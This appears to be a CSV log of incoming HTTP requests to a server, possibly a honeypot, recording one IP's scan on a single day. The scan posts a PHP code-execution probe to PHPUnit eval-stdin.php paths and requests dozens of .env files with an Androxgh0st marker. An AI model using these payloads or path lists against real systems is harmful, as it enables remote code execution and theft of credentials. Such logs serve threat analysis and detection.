ymd,time,from_ip_address,to_ip_address,HTTP,status_code,TorF,basic64,res,url,country
2023-10-13,2023-10-13 21:45:29,129.146.38.85,***.***.***.***,POST /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php HTTP/1.1,200,False,"POST /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:29,129.146.38.85,***.***.***.***,POST /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:30,129.146.38.85,***.***.***.***,POST /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:30,129.146.38.85,***.***.***.***,POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:31,129.146.38.85,***.***.***.***,POST /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:31,129.146.38.85,***.***.***.***,POST /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:32,129.146.38.85,***.***.***.***,POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:32,129.146.38.85,***.***.***.***,POST /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:32,129.146.38.85,***.***.***.***,POST /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:33,129.146.38.85,***.***.***.***,POST /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"POST /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 29

<?php echo ""EmperorsTools"";?>",POST,POST /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:33,129.146.38.85,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET / HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:34,129.146.38.85,***.***.***.***,GET /.DS_Store HTTP/1.1,200,False,"GET /.DS_Store HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.DS_Store HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:34,129.146.38.85,***.***.***.***,GET /.env HTTP/1.1,200,False,"GET /.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:35,129.146.38.85,***.***.***.***,POST /.env HTTP/1.1,200,False,"POST /.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:35,129.146.38.85,***.***.***.***,GET /.env.save HTTP/1.1,200,False,"GET /.env.save HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.save HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:35,129.146.38.85,***.***.***.***,POST /.env.save HTTP/1.1,200,False,"POST /.env.save HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.save HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:36,129.146.38.85,***.***.***.***,GET /.env.old HTTP/1.1,200,False,"GET /.env.old HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.old HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:36,129.146.38.85,***.***.***.***,POST /.env.old HTTP/1.1,200,False,"POST /.env.old HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.old HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:37,129.146.38.85,***.***.***.***,GET /.env.prod HTTP/1.1,200,False,"GET /.env.prod HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.prod HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:37,129.146.38.85,***.***.***.***,POST /.env.prod HTTP/1.1,200,False,"POST /.env.prod HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.prod HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:38,129.146.38.85,***.***.***.***,GET /.env.production HTTP/1.1,200,False,"GET /.env.production HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.production HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:38,129.146.38.85,***.***.***.***,POST /.env.production HTTP/1.1,200,False,"POST /.env.production HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.production HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:39,129.146.38.85,***.***.***.***,GET /.env.development HTTP/1.1,200,False,"GET /.env.development HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.development HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:39,129.146.38.85,***.***.***.***,POST /.env.development HTTP/1.1,200,False,"POST /.env.development HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.development HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:39,129.146.38.85,***.***.***.***,GET /laravel/.env HTTP/1.1,200,False,"GET /laravel/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /laravel/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:40,129.146.38.85,***.***.***.***,POST /laravel/.env HTTP/1.1,200,False,"POST /laravel/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /laravel/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:40,129.146.38.85,***.***.***.***,GET /admin-app/.env HTTP/1.1,200,False,"GET /admin-app/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /admin-app/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:41,129.146.38.85,***.***.***.***,POST /admin-app/.env HTTP/1.1,200,False,"POST /admin-app/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /admin-app/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:41,129.146.38.85,***.***.***.***,GET /api/.env HTTP/1.1,200,False,"GET /api/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /api/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:42,129.146.38.85,***.***.***.***,POST /api/.env HTTP/1.1,200,False,"POST /api/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /api/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:42,129.146.38.85,***.***.***.***,GET /app/.env HTTP/1.1,200,False,"GET /app/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /app/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:43,129.146.38.85,***.***.***.***,POST /app/.env HTTP/1.1,200,False,"POST /app/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /app/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:43,129.146.38.85,***.***.***.***,GET /development/.env HTTP/1.1,200,False,"GET /development/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /development/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:43,129.146.38.85,***.***.***.***,POST /development/.env HTTP/1.1,200,False,"POST /development/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /development/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:44,129.146.38.85,***.***.***.***,GET /apps/.env HTTP/1.1,200,False,"GET /apps/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /apps/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:44,129.146.38.85,***.***.***.***,POST /apps/.env HTTP/1.1,200,False,"POST /apps/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /apps/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:44,129.146.38.85,***.***.***.***,GET /cp/.env HTTP/1.1,200,False,"GET /cp/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /cp/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:45,129.146.38.85,***.***.***.***,POST /cp/.env HTTP/1.1,200,False,"POST /cp/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /cp/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:45,129.146.38.85,***.***.***.***,GET /private/.env HTTP/1.1,200,False,"GET /private/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /private/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:46,129.146.38.85,***.***.***.***,POST /private/.env HTTP/1.1,200,False,"POST /private/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /private/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:46,129.146.38.85,***.***.***.***,GET /system/.env HTTP/1.1,200,False,"GET /system/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /system/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:46,129.146.38.85,***.***.***.***,POST /system/.env HTTP/1.1,200,False,"POST /system/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /system/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:47,129.146.38.85,***.***.***.***,GET /docker/.env HTTP/1.1,200,False,"GET /docker/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /docker/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:47,129.146.38.85,***.***.***.***,POST /docker/.env HTTP/1.1,200,False,"POST /docker/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /docker/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:48,129.146.38.85,***.***.***.***,GET /cms/.env HTTP/1.1,200,False,"GET /cms/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /cms/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:48,129.146.38.85,***.***.***.***,POST /cms/.env HTTP/1.1,200,False,"POST /cms/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /cms/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:49,129.146.38.85,***.***.***.***,GET /script/.env HTTP/1.1,200,False,"GET /script/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /script/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:49,129.146.38.85,***.***.***.***,POST /script/.env HTTP/1.1,200,False,"POST /script/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /script/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:50,129.146.38.85,***.***.***.***,GET /live_env HTTP/1.1,200,False,"GET /live_env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /live_env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:50,129.146.38.85,***.***.***.***,POST /live_env HTTP/1.1,200,False,"POST /live_env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /live_env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:51,129.146.38.85,***.***.***.***,GET /application/.env HTTP/1.1,200,False,"GET /application/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /application/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:51,129.146.38.85,***.***.***.***,POST /application/.env HTTP/1.1,200,False,"POST /application/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /application/.env HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:51,129.146.38.85,***.***.***.***,GET /.env.project HTTP/1.1,200,False,"GET /.env.project HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.project HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:52,129.146.38.85,***.***.***.***,POST /.env.project HTTP/1.1,200,False,"POST /.env.project HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.project HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:52,129.146.38.85,***.***.***.***,GET /.env.dist HTTP/1.1,200,False,"GET /.env.dist HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: *
Accept: */*
Connection: keep-alive

",GET,GET /.env.dist HTTP/1.1,United States
2023-10-13,2023-10-13 21:45:52,129.146.38.85,***.***.***.***,POST /.env.dist HTTP/1.1,200,False,"POST /.env.dist HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: *
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST /.env.dist HTTP/1.1,United States
